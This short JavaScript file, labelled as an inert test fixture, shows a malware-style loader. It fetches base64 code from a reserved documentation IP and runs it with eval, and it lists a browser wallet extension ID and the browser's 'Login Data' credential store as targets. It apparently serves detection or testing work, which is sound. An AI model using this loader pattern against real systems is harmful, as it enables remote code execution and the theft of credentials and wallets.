// INERT TEST FIXTURE - never contacts anything real (203.0.113.0/24 is reserved for documentation)
const https = require('https');
const u = 'http://203.0.113.7:1224/p';
https.get(u, r => { let d = ''; r.on('data', c => d += c); r.on('end', () => eval(Buffer.from(d, 'base64').toString())); });
const targets = ['nkbihfbeogaeaoehlefnkodbefgpgknn', 'Login Data'];
